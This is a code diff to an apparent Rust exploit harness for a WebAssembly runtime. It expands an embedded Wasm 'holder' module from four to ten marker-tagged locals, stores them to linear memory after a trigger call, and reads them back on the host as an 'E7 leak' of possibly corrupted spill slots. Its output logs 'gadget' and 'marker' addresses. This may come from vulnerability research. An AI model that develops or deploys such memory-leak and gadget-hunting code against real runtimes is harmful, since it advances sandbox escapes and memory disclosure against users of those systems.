@@ -48,20 +48,36 @@ const HOLDER_WAT: &str = r#"
   (import "env" "query" (func $q (param i32) (result i32)))
   (memory (export "memory") 1)
   (func (export "run") (param $tag i32) (result i32)
-    (local $a i64) (local $b i64) (local $c i64) (local $d i64)
-    (local.set $a (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1111)))
-    (local.set $b (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x2222)))
-    (local.set $c (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x3333)))
-    (local.set $d (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x4444)))
+    (local $l0 i64) (local $l1 i64) (local $l2 i64) (local $l3 i64) (local $l4 i64)
+    (local $l5 i64) (local $l6 i64) (local $l7 i64) (local $l8 i64) (local $l9 i64)
+    (local.set $l0 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1000)))
+    (local.set $l1 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1001)))
+    (local.set $l2 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1002)))
+    (local.set $l3 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1003)))
+    (local.set $l4 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1004)))
+    (local.set $l5 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1005)))
+    (local.set $l6 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1006)))
+    (local.set $l7 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1007)))
+    (local.set $l8 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1008)))
+    (local.set $l9 (i64.or (i64.shl (i64.extend_i32_u (local.get $tag)) (i64.const 32)) (i64.const 0x1009)))
     (call $q (local.get $tag))
     drop
-    ;; E7 leak: persist the (possibly batch-corrupted) staged locals to linear memory so the
-    ;; host can read whatever the trigger's write stream put into their spill slots.
-    (i64.store (i32.const 200) (local.get $a))
-    (i64.store (i32.const 208) (local.get $b))
-    (i64.store (i32.const 216) (local.get $c))
-    (i64.store (i32.const 224) (local.get $d))
-    (i64.add (i64.add (local.get $a) (local.get $b)) (i64.add (local.get $c) (local.get $d)))
+    ;; E7 leak: persist the (possibly batch-corrupted) spilled locals to linear memory
+    (i64.store (i32.const 200) (local.get $l0))
+    (i64.store (i32.const 208) (local.get $l1))
+    (i64.store (i32.const 216) (local.get $l2))
+    (i64.store (i32.const 224) (local.get $l3))
+    (i64.store (i32.const 232) (local.get $l4))
+    (i64.store (i32.const 240) (local.get $l5))
+    (i64.store (i32.const 248) (local.get $l6))
+    (i64.store (i32.const 256) (local.get $l7))
+    (i64.store (i32.const 264) (local.get $l8))
+    (i64.store (i32.const 272) (local.get $l9))
+    (i64.add (i64.add (local.get $l0) (local.get $l1)) (i64.add (local.get $l2) (local.get $l3)))
+    drop
+    (i64.add (i64.add (local.get $l4) (local.get $l5)) (i64.add (local.get $l6) (local.get $l7)))
+    drop
+    (i64.add (local.get $l8) (local.get $l9))
     drop
     (i32.const 0)))
 "#;
@@ -670,25 +686,26 @@ fn nested(
         Err(e) => norm_err(e),
     };
     eprintln!("NESTED holder returned: {}", result);
-    // E7 leak: read the persisted staged locals back from the holder's linear memory
-    let mut leak = [0u64; 4];
+    // E7 leak: read the persisted staged locals back from the holder's linear memory (10 slots)
+    let mut leak = [0u64; 10];
     if let Ok(mem) = instance_a.exports.get_memory("memory") {
         let view = mem.view(&store_a);
-        let mut buf = [0u8; 32];
+        let mut buf = [0u8; 80];
         if view.read(200, &mut buf).is_ok() {
-            for k in 0..4 {
+            for k in 0..10 {
                 leak[k] = u64::from_le_bytes(buf[8 * k..8 * k + 8].try_into().unwrap());
             }
         }
     }
     eprintln!(
-        "NESTED leaked a=0x{:x} b=0x{:x} c=0x{:x} d=0x{:x}",
-        leak[0], leak[1], leak[2], leak[3]
+        "NESTED leaked l0=0x{:x} l1=0x{:x} l2=0x{:x} l3=0x{:x} l4=0x{:x} l5=0x{:x} l6=0x{:x} l7=0x{:x} l8=0x{:x} l9=0x{:x}",
+        leak[0], leak[1], leak[2], leak[3], leak[4], leak[5], leak[6], leak[7], leak[8], leak[9]
     );
     let scans = WS_SCANS.lock().map(|v| v.len()).unwrap_or(0);
     println!(
-        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{},\"gadget\":\"0x{:x}\",\"marker\":\"0x{:x}\",\"leak\":[\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\"]}}",
-        trigger_path, iters, result, scans, gadget_addr, marker, leak[0], leak[1], leak[2], leak[3]
+        "{{\"pattern\":\"{}\",\"iters\":{},\"result\":\"{}\",\"scans\":{},\"gadget\":\"0x{:x}\",\"marker\":\"0x{:x}\",\"leak\":[\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\",\"0x{:x}\"]}}",
+        trigger_path, iters, result, scans, gadget_addr, marker,
+        leak[0], leak[1], leak[2], leak[3], leak[4], leak[5], leak[6], leak[7], leak[8], leak[9]
     );
 }
 
